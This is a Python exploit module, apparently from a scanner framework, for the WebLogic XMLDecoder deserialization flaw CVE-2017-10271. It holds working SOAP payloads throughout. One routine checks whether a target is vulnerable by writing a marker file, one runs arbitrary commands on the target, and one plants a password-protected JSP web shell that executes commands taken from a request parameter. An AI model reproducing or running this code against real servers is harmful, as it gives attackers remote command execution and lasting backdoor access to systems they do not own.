#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import random
from script import Script, SERVICE_PORT_MAP

shellpoc1 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">


    <object class="java.io.PrintWriter">
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/ahtest.jsp</string>
    <void method="println"><string>
    <![CDATA[
<%
    if("ahtest".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[102400];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
    out.print("ahtest");
    %>]]>
    </string>
    </void>
    <void method="close"/>
    </object>
    </java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>'''

shellpoc2 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter">  <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/ahtest.jsp</string>
    <void method="println"><string>
    <![CDATA[
    <%
    if("ahtest".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[102400];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
    out.print("ahtest");
    %>]]>
    </string>
    </void>
    <void method="close"/>
    </object>

    </java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>'''

html_escape_table = {
    "&": "&amp;",
    '"': "&quot;",
    "'": "&apos;",
    ">": "&gt;",
    "<": "&lt;",
}
poc1 = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="'''

poc3 = '''
</array>
<void method="start" />
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
</soapenv:Body>
</soapenv:Envelope>
'''

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEBLOGIC
        self.name = 'CVE-2017-10271'
        self.keyword = ['weblogic']
        self.info = 'CVE-2017-10271'
        self.type = 'rce'
        self.level = 'high'
        self.refer = 'http://www.cnvd.org.cn/webinfo/show/4999'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            headers = {"Content-Type": "text/xml"}
            url = self.base_url+'wls-wsat/CoordinatorPortType'
            ran = str(random.randint(100000, 999999))
            poc = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/' + ran + '.txt</string><void method="println"><string>xmldecoder_vul_test</string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
            try:
                result = self.curl('post', url, data=poc, headers=headers)
                targeturl = self.base_url + "/bea_wls_internal/" + ran + ".txt"
                result = self.curl('get', targeturl)
                if result and str(result.status_code) == '200' and 'xmldecoder_vul_test' in result.text:
                    self.flag = 1
                    self.req.append({"page": '/wls-wsat/CoordinatorPortType'})
                    self.res.append({"info": url, "key": targeturl})
                else:
                    ran = str(random.randint(100000, 999999))
                    poc = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/' + ran + '.txt</string><void method="println"><string>xmldecoder_vul_test</string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
                    result = self.curl('post', url, data=poc, headers=headers)
                    targeturl = self.base_url + "/wls-wsat/" + ran + ".txt"
                    result = self.curl('get', url)
                    if  result and str(result.status_code) == '200' and 'xmldecoder_vul_test' in result.text:
                        self.flag = 1
                        self.req.append({"page": '/wls-wsat/CoordinatorPortType'})
                        self.res.append({"info": targeturl, "key": '/wls-wsat/CoordinatorPortType'})
            except Exception as e:
                pass

    def exec(self):
        self.get_url()
        if self.base_url:
            headers = {"Content-Type": "text/xml"}
            poc2 = ''
            poc = None
            command = self.parameter['cmd']
            if command != None:
                commands = command.split()
                for i in range(0, len(commands)):
                    poc2 += '<void index="' + str(i) + '"><string>' + "".join(
                        html_escape_table.get(c, c) for c in commands[i]) + '</string></void>'
                poc = poc1 + str(len(commands)) + '">' + poc2 + poc3
            targeturl = self.base_url + "/wls-wsat/CoordinatorPortType"
            result = self.curl('post', targeturl, data=poc, headers=headers)
            if str(result.status_code) == '500':
                self.flag = 1
                self.req.append({"page": '/wls-wsat/CoordinatorPortType'})
                self.res.append({"info": result.text, "key": targeturl})

    def upload(self):
        self.get_url()
        if self.base_url:
            headers = {"Content-Type": "text/xml"}
            url = self.base_url + 'wls-wsat/CoordinatorPortType'
            result = self.curl('post', url, data=shellpoc1, headers=headers)
            targeturl = self.base_url + "/bea_wls_internal/ahtest.jsp"
            result = self.curl('get', targeturl)
            if str(result.status_code) == '200' and 'ahtest' in result.text:
                self.flag = 1
                self.req.append({"page": '/wls-wsat/CoordinatorPortType'})
                self.res.append({"info": url, "key": targeturl + "?pwd=ahtest&cmd=whoami"})
            else:
                result = self.curl('post', url, data=shellpoc2, headers=headers)
                targeturl = self.base_url + "/wls-wsat/ahtest.jsp"
                result = self.curl('get', targeturl)
                if str(result.status_code) == '200' and 'ahtest' in result.text:
                    self.flag = 1
                    self.req.append({"page": '/wls-wsat/CoordinatorPortType'})
                    self.res.append({"info": targeturl + "?pwd=ahtest&cmd=whoami", "key": "/wls-wsat/CoordinatorPortType"})
